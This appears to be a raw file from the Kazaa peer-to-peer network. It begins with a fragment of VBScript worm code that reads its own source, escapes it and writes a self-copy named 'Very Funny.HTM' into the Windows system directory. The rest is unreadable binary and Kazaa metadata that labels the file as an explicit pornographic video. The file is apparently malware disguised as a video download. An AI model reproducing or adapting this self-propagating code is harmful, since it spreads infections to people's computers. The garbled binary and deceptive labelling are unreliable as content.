set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\Very Funny.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\Very Funny.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub                                     �v �Jw�|`�c���m�	��ט���P��%r��{���d0^��eplZ=u�J����;��r���Lqs/�MZ�u���{b����(��m� ��m��������G�p윶�Ye4֗��D�����U��/�(u���gm���Բ�*���	W�p�xJiۺ�%�g�Op���Fw !�e����72E���b���n��A��a�a��3��Օ��&�X'�N����J����i�ן(Q[���oM�%y�s�~�.�Ҕz����\-�S҆f�M��ߧ�W7�pz�}�]%�!��k�_����?��Co�e���c*l�r�_P͠� ��JE��%ziq{�U9���b/	�O.�]��*���)Ay�NK{?��kθ�Ǉ�����*�i����kew�Jb};�q}⻗��)1����\jrµCLI���Ws�aoz�!���g���g���co;�A������B����.�h�-u���Z���>��� �n.�w���|ʅ�\�B_�7���MBcD#����;��9��/
eI�(3$�[�8dU_�r���A�����d��B��
ʧ�~s�G�����M|��'��Rk�ys��O~&��W���?ϕu�T�f`Ғ�X&a]��ܤ���;t���B�L��5S��p���0��JB���&�-i<�<����T�t�V�<�Z�m��m��N
�zu=傌iG��*b��f�p�q%��5��w��hB��IA��SAq�&MѲCx�w6���	��C'�r�%ف�lR.#��R5jȦ ��w1��t�8^D����
M��*N�f�]*į���������X8���|f���n:_z;є��������UӋK�ӺҞԈ�s�ӪN^�l���C��
ٰ�Q�6e`.a��@^�\�,),�ϒI�߽u�v}�,`0-��sr&	��>s�ol���}NnL�!γ&��g�H�&o��IΝ]���7@$����S�`E.<�{����I�ݭ�֐a�l-��v���vg��&���@g�n#>!��W*r'���_EF��F��	[�7K3�4e*II���s\�I _�k�0��V���&!?-�.��@����q������>��k9h����u'�|!�M@����<�l㈹7?����4R!B�ωV�hpl@����a��g�Y�K��zw����!�i�����ݼ����R��s7(��9�%�!&�Eڅb�t:�Șy�3i:\�yh�����)U��M�ݏ	'w%хe���VjdM�@(}��(����N���\�uW������:��؝��x�>0�D��|NUkt���0���ܾ��o�qR���[��(\����r4cTR~rF��ݾ"�F�:�� ���Ĳ�	��{${��;��=���K�]��Gf�*pg��t�>�Y�.`�-���9G����V-�d�RM�m3~tTC�fDii[Y�fXh�ˎc,B_EXڐT���iN�gz��'��6��	�2��Ġ�ygVt���4쓆G��|iT��U��w"&}7<��-���/|cŦ�ܵ���C̰Ӵ־;�������:��[�7�zt�LIZx�cL��kRn.�f�M/�p��|nٽ���e�V�Ϻ�[CE�V�`�z��L3�l�������i�WbI6�	���U/�����
�v��~\����3�����7�1�����*�V�x&����A��o1j���
�r3B�,m���yW�L�
�jjڈ"��?Bu��vs q�6�)mG��k�6�fY,�ނa���֡i�d����g�T��$���Nn�6{@T	����%���m��9��FQH���Wa	.@bzO�u+_VP�*����	�܍�_tήȶ����70t�K��j���^�ö�ũ~~�ޯ�ѧ�+E��+.���Qj��S�)�tK2%sK�����u����+lH�2�Z;Aʭw0�m�����-�����l�n�5������l(�ŭ�ʬ;<�6W]��V��|77h ���r��/��UC��)�^������t��j�,�%��f�ˬ�% �6e����[���"ʸ?G� t	D��Z0wX�2u�4X��}�D�VaE��g_ұ�Z����r�OͲ|��?�:%l\_���Nn`�v"�S[��w/%�ߟ��)�e�h���_}��D�( TP�=���r�v�k�u#�I�D�G�J�O�������Q�J��^#�F�>i4t�~nŀ|�]6�϶~U��B���݆���~D���W�N�h�8��{�\�j�����p�2?n�Ā�)��<�{1 ��5�o�[*��4������/m0D���.�F@���-d?G_��{���(9��h^�����aa�P,.��3ʯL�1��U�ܡ��� 쿆	jX�Uc�n쪠Ռ��Q�%�X��>K��9��-�s2�I�M�~u�rWhiE9^l�|��}��.���:H�V}�D��?S�n'�U�\V	X���J�?x�pF��_�X�e��!���sݐ���I�s���D��^�'M��Rog��@
	c�� �i�a�ֽ6.��)��w�˰��F�uҐ��.Q�/�l��[���sO��Mؙ       Redhead in changing room.avi  ?+  �@�ʩ5��ҵ�>�Y�nM��%��  �p�D  Inertiac@Kazaa ����   ���      ���
   ր  ���    ������    
                                �   �         A        q        i263       Ruby - Fucked In Changin Room       Erotica       Amateur 
      en       Redheads, Sex    (   Ruby in an audition (Starfinder series)       Milf Hunter !      ��      �@�ʩ5��ҵ�>�Y�nM��A����    C:\My Shared Folder\Redhead in changing room.avi            ������         KAZAl��